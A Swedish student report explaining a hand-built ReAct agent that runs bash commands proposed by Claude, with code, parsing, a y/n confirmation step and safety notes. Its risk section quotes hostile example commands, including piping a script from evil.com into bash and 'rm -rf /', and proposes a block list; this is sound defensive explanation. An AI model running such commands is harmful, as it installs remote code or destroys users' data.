# Assignment 2 – Del 1: ReAct Agent
## Teknisk rapport och dokumentation

**Student:** Magnus Rösman  
**Kurs:** ML1, Teknikhögskolan  
**Datum:** Maj 2026  

---

## 1. Sammanfattning

I Del 1 har jag byggt en ReAct-agent (Reasoning + Acting) i ren Python. Agenten tar emot en uppgift i naturligt språk, resonerar steg för steg, kör bash-kommandon, och levererar ett slutsvar. Agenten använder Anthropic API (Claude Sonnet 4.6) men **inte** dess inbyggda function-calling – istället instrueras modellen via en system-prompt att svara i ett specifikt textformat som min egen Python-kod parsar.

Inga ramverk (LangChain, LangGraph, etc.) används. All logik – ReAct-loopen, parsningen, kommandoexekveringen och säkerhetshanteringen – är skriven från scratch.

---

## 2. Vad är en ReAct-agent?

ReAct står för **Reasoning + Acting** och är ett mönster för AI-agenter som publicerades av forskare vid Princeton och Google 2022. Grundidén är enkel: istället för att en LLM bara resonerar (som en vanlig chatbot) eller bara agerar (som ett skript), så **växlar den mellan att tänka och handla**.

Cykeln ser ut så här:

```
THOUGHT  →  ACTION  →  OBSERVATION  →  THOUGHT  →  ACTION  →  ...  →  ANSWER
```

1. **THOUGHT** – Modellen resonerar om vad den behöver göra härnäst
2. **ACTION** – Modellen väljer ett verktyg (i vårt fall bash) och ett kommando
3. **OBSERVATION** – Kommandot körs och resultatet matas tillbaka till modellen
4. **ANSWER** – När modellen anser sig klar, ger den ett slutsvar

Det som gör ReAct kraftfullt är att modellen kan **reagera på oväntade resultat**. Om ett kommando misslyckas kan den prova en annan approach. Om resultatet visar något oväntat kan den anpassa sin strategi. Det är detta som skiljer en agent från ett enkelt skript.

---

## 3. Varför "hemmagjord" function-calling?

Modern LLM-API:er (som Anthropics och OpenAI:s) har inbyggt stöd för **function-calling** via en `tools`-parameter. Men i Del 1 är det **uttryckligen förbjudet** att använda detta.

Istället bygger vi vår egen variant:

| Inbyggd function-calling | Vår hemmagjorda variant |
|--------------------------|------------------------|
| API:t har en `tools`-parameter | Vi har en system-prompt som instruerar modellen |
| Modellen returnerar strukturerad JSON | Modellen returnerar formaterad text |
| SDK:n parsar svaret automatiskt | Vår Python-kod parsar med regex |

**Poängen med detta** är pedagogisk: vi ska förstå att function-calling egentligen bara är prompt engineering + parsing. Det som SDK:er och ramverk gör "automagiskt" är i grunden samma sak som vi gör manuellt – de instruerar modellen att svara i ett format och parsar sedan svaret.

---

## 4. Filstruktur

```
react-agent/
├── agent.py            # All kod – ReAct-loopen, parsning, exekvering
├── .env                # ANTHROPIC_API_KEY (gitignored)
├── .env.example        # Mall för .env
├── .gitignore          # Ignorerar .env och venv/
├── requirements.txt    # anthropic, python-dotenv
├── venv/               # Virtuell Python-miljö
└── README.md           # Kort beskrivning
```

---

## 5. Koden i detalj

### 5.1 Imports och setup

```python
import os
import re
import subprocess

import anthropic
from dotenv import load_dotenv

load_dotenv()

MODEL = "claude-sonnet-4-6"
```

- **os** – Används för att läsa miljövariabler (`os.environ["ANTHROPIC_API_KEY"]`)
- **re** – Pythons regex-bibliotek. Används för att hitta mönster i modellens svar (t.ex. "COMMAND: ls -la")
- **subprocess** – Kör bash-kommandon från Python och fångar deras output
- **anthropic** – Anthropics officiella SDK för att prata med Claude API
- **dotenv** – Läser in `.env`-filen så att API-nyckeln finns tillgänglig som miljövariabel
- **MODEL** – Vilken Claude-modell vi använder. Sonnet 4.6 valdes för kostnadseffektivitet – agenten gör många API-anrop i sin loop, och Opus 4.7 kostar betydligt mer per anrop

### 5.2 System-prompten

```python
SYSTEM_PROMPT = """You are a helpful assistant that can run bash commands...

When you need to run a command, respond in EXACTLY this format:

THOUGHT: <your reasoning about what to do next>
ACTION: bash
COMMAND: <the bash command to run>

When you have a final answer:

ANSWER: <your complete answer to the user>

Rules:
- Only use THOUGHT/ACTION/COMMAND or ANSWER — never mix them.
- Wait for the OBSERVATION before continuing.
- Keep commands simple and safe.
- If a command fails, try a different approach.
"""
```

System-prompten är **kärnan i hela agenten**. Det är den som gör att modellen svarar i ett format vi kan parsa. Utan den skulle Claude svara i vanlig prosa och vi skulle inte kunna plocka ut kommandon.

Notera att detta skickas som `system`-parametern i API-anropet – inte som ett vanligt meddelande. System-prompten sätter ramarna för hela konversationen.

**Varför det fungerar:** LLM:er som Claude är tränade att följa instruktioner. När vi säger "respond in EXACTLY this format" och visar formatet, kommer modellen i de allra flesta fall att lyda. Men inte alltid – det är därför vi behöver robust parsning och fallback-hantering (se sektion 5.3).

### 5.3 Parsningsfunktioner

#### parse_command()

```python
def parse_command(text: str) -> str | None:
    match = re.search(r"^COMMAND:\s*(.+)$", text, re.MULTILINE)
    if match:
        return match.group(1).strip()
    return None
```

Denna funktion tar modellens hela svar som input och letar efter en rad som börjar med "COMMAND:". Regex-mönstret fungerar så här:

- `^` – radens början (tack vare `re.MULTILINE`)
- `COMMAND:` – den exakta texten vi letar efter
- `\s*` – noll eller fler mellanslag efter kolontecknet
- `(.+)` – fånga resten av raden (detta är själva kommandot)
- `$` – radens slut

`match.group(1)` returnerar det som fångades av `(.+)`, alltså själva bash-kommandot. Om mönstret inte hittas returneras `None`.

#### is_final_answer()

```python
def is_final_answer(text: str) -> bool:
    return bool(re.search(r"^ANSWER:", text, re.MULTILINE))
```

Enkel kontroll: finns det en rad som börjar med "ANSWER:" i svaret? Returnerar `True` eller `False`.

#### extract_answer()

```python
def extract_answer(text: str) -> str:
    match = re.search(r"^ANSWER:\s*(.+)", text, re.MULTILINE | re.DOTALL)
    if match:
        return match.group(1).strip()
    return text
```

Plockar ut allt som kommer efter "ANSWER:". `re.DOTALL` gör att `.` matchar även radbrytningar, så hela svaret fångas även om det sträcker sig över flera rader.

### 5.4 Kommandoexekvering med säkerhet

#### ask_user_confirmation()

```python
def ask_user_confirmation(command: str) -> bool:
    print(f"\n  Command to run: {command}")
    answer = input("  Run this command? [y/n]: ").strip().lower()
    return answer in ("y", "yes")
```

**Säkerhetsmekanismen.** Innan något kommando körs visas det för användaren som måste godkänna med "y" eller "yes". Detta förhindrar att agenten kör destruktiva kommandon som `rm -rf /` eller `sudo`-kommandon.

Denna funktion är enkel men central – den uppfyller Gabriels krav på att agenten inte ska kunna köra farliga kommandon utan mänsklig kontroll.

#### run_command()

```python
def run_command(command: str) -> str:
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout + result.stderr
        return output.strip() if output.strip() else "(no output)"
    except subprocess.TimeoutExpired:
        return "ERROR: command timed out after 30 seconds"
    except Exception as e:
        return f"ERROR: {e}"
```

Denna funktion kör det faktiska bash-kommandot. Parametrarna:

- **shell=True** – Kör kommandot genom `/bin/sh` så att pipes (`|`), redirects (`>`), och andra shell-funktioner fungerar
- **capture_output=True** – Fånga både stdout (normal output) och stderr (felmeddelanden)
- **text=True** – Konvertera bytes till strängar automatiskt
- **timeout=30** – Avbryt efter 30 sekunder om kommandot hänger sig

Stdout och stderr slås ihop till en sträng som returneras. Om kommandot inte ger någon output returneras "(no output)" – detta är viktigt eftersom modellen behöver något att reagera på.

### 5.5 main() – programmets startpunkt

```python
def main() -> None:
    print("ReAct Agent (type 'quit' to exit)")
    print("=" * 60)

    while True:
        try:
            task = input("\nYour task: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nGoodbye!")
            break

        if task.lower() in ("quit", "exit", "q"):
            print("Goodbye!")
            break

        if not task:
            continue

        run_agent(task)

if __name__ == "__main__":
    main()
```

`main()` gör tre saker:
1. Visar en rubrik
2. Frågar efter en uppgift i en oändlig loop
3. Skickar uppgiften till `run_agent()`

- `try/except` – Fångar Ctrl+C och Ctrl+D för att avsluta snyggt
- `if task.lower() in ("quit", "exit", "q")` – Tre sätt att avsluta
- `if not task: continue` – Om användaren trycker Enter utan text, fråga igen
- `if __name__ == "__main__"` – Standardmönster i Python som säger "kör main() bara om filen körs direkt, inte om den importeras"
- `-> None` – Type hint som talar om att funktionen inte returnerar något värde

### 5.6 run_agent() – agentens hjärta

```python
def run_agent(user_task: str) -> None:
    client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])

    messages = [
        {"role": "user", "content": user_task},
    ]

    step = 1

    while True:
        # 1. Anropa Claude API
        response = client.messages.create(
            model=MODEL,
            max_tokens=1024,
            system=SYSTEM_PROMPT,
            messages=messages,
        )
        model_text = response.content[0].text.strip()

        # 2. Kolla om det är ett slutsvar
        if is_final_answer(model_text):
            print(extract_answer(model_text))
            break

        # 3. Plocka ut kommandot
        command = parse_command(model_text)
        if command is None:
            break

        # 4. Fråga användaren och kör
        if ask_user_confirmation(command):
            observation = run_command(command)
        else:
            observation = "User declined to run the command."

        # 5. Bygg vidare på konversationshistoriken
        messages.append({"role": "assistant", "content": model_text})
        messages.append({"role": "user", "content": f"OBSERVATION: {observation}"})

        step += 1
```

Detta är hela ReAct-loopen. Steg för steg:

**Steg 1 – API-anropet:**
`client.messages.create()` skickar hela konversationshistoriken till Claude. Notera att det INTE finns någon `tools`-parameter – det är vår system-prompt som styr formatet, inte API:ts inbyggda function-calling.

**Steg 2 – Kolla slutsvar:**
Om modellen svarade med "ANSWER:" är vi klara. Loopen bryts.

**Steg 3 – Plocka ut kommando:**
Om det inte var ett slutsvar, försök hitta ett "COMMAND:" i svaret. Om det inte finns (modellen svarade i fel format) – avbryt.

**Steg 4 – Säkerhet och exekvering:**
Visa kommandot, fråga y/n, kör det om godkänt.

**Steg 5 – Bygg historik:**
Det här är avgörande. Vi lägger till modellens svar som `"assistant"` och kommandots resultat som `"user"` med prefixet "OBSERVATION:". Nästa varv skickas allt till API:t igen. Modellen ser: uppgiften → sitt eget resonemang → vad kommandot returnerade → och kan fortsätta därifrån.

#### Konversationshistoriken växer för varje steg:

**Varv 1:**
```
user: "List all files"
```

**Varv 2:**
```
user: "List all files"
assistant: "THOUGHT: ... ACTION: bash COMMAND: ls -la"
user: "OBSERVATION: total 64 ..."
```

**Varv 3:**
```
user: "List all files"
assistant: "THOUGHT: ... ACTION: bash COMMAND: ls -la"
user: "OBSERVATION: total 64 ..."
assistant: "ANSWER: Here are all files..."
```

---

## 6. Säkerhetsaspekter

### 6.1 Varför säkerhet behövs

En agent som kör bash-kommandon kan potentiellt:
- **Radera filer:** `rm -rf /` eller `rm -rf ~`
- **Installera skadlig kod:** `curl http://evil.com/script.sh | bash`
- **Eskalera privilegier:** `sudo`-kommandon
- **Skicka data:** `curl` med känslig information
- **Förbruka resurser:** Oändliga loopar som kostar API-credits

### 6.2 Implementerade skydd

1. **Manuell bekräftelse (y/n):** Varje kommando visas för användaren innan det körs. Användaren kan neka.
2. **Timeout (30 sekunder):** Kommandon som hänger sig avbryts automatiskt.
3. **max_tokens (1024):** Begränsar modellens svarslängd per anrop, vilket indirekt begränsar kostnaderna.

### 6.3 Möjliga förbättringar (för Del 2)

- **Blocklista:** Automatiskt neka kommandon som innehåller `rm -rf`, `sudo`, `mkfs`, etc.
- **Vitlista:** Tillåt bara specifika kommandon (ls, cat, python, git, etc.)
- **Docker-container:** Kör agenten i en isolerad miljö där värsta fall bara dödar containern
- **Token-budget:** Sätt en maxgräns på totala API-kostnaden per session

---

## 7. Observerade problem och lärdomar

### 7.1 Modellen följer inte alltid formatet

Vid testkörning svarade modellen ibland med en snygg tabell istället för att börja med "ANSWER:". Parsern hittade varken "COMMAND:" eller "ANSWER:" och agenten stoppades med "Could not parse a command or answer."

**Lärdom:** Man kan aldrig lita till 100% på att en LLM följer instruktioner exakt. Robust parsning med fallback-hantering är nödvändigt. I vår kod innebär det att om parsern inte hittar ett förväntat mönster bör vi behandla svaret som ett slutsvar snarare än att krascha.

### 7.2 Modellversioner och deprecation

Den ursprungliga modellsträngen `claude-sonnet-4-20250514` var utfasad och gav 404-error. Vi bytte till `claude-sonnet-4-6` som är den nuvarande Sonnet-versionen.

**Lärdom:** Modell-ID:n ändras över tid. Håll koll på Anthropics dokumentation och var beredd att uppdatera.

### 7.3 Python-miljö på Mac

`pip install` gav error på grund av Macs "externally managed environment". Lösningen var att skapa en virtuell miljö med `python3 -m venv venv`.

**Lärdom:** Använd alltid virtual environments för Python-projekt. Det isolerar paket och undviker systemkonflikter.

---

## 8. Teknikval och motivering

| Val | Motivering |
|-----|-----------|
| **Claude Sonnet 4.6** | Bra balans mellan kapacitet och kostnad. Opus 4.7 är smartare men dyrare – onödigt för bash-kommandon. |
| **Anthropic SDK** | Officiellt bibliotek, enklare än raw HTTP-requests. |
| **Regex för parsning** | Enkelt, tydligt, och tillräckligt för det strukturerade format vi definierat. |
| **subprocess.run()** | Standardbiblioteket i Python för att köra externa kommandon. Bättre än os.system() eftersom det fångar output. |
| **python-dotenv** | Håller API-nycklar utanför koden. Bästa praxis för alla projekt. |

---

## 9. Koppling till Assignment 2 Del 2 och Del 3

Del 1 lägger grunden som Del 2 och Del 3 bygger vidare på:

- **Del 2** kommer byta textparsning mot structured output och lägga till filredigering, multipla tool-calls utan y/n varje gång, config-fil för system-prompten, och starkare säkerhet.
- **Del 3** kommer koppla ihop alla studenters agenter i en gemensam chatt för att samarbeta kring mjukvaruutveckling, med rate-limiting och token-budgetar.

Men grundmönstret – ReAct-loopen med THOUGHT → ACTION → OBSERVATION → ANSWER – förblir detsamma genom alla tre delar.
